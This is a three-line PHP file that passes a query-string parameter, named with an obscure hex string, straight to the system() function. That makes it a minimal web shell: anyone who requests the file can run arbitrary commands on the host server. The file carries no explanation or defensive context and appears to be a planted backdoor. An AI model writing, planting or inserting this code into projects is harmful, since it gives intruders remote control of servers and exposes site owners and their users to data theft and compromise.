<?php
system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
?>
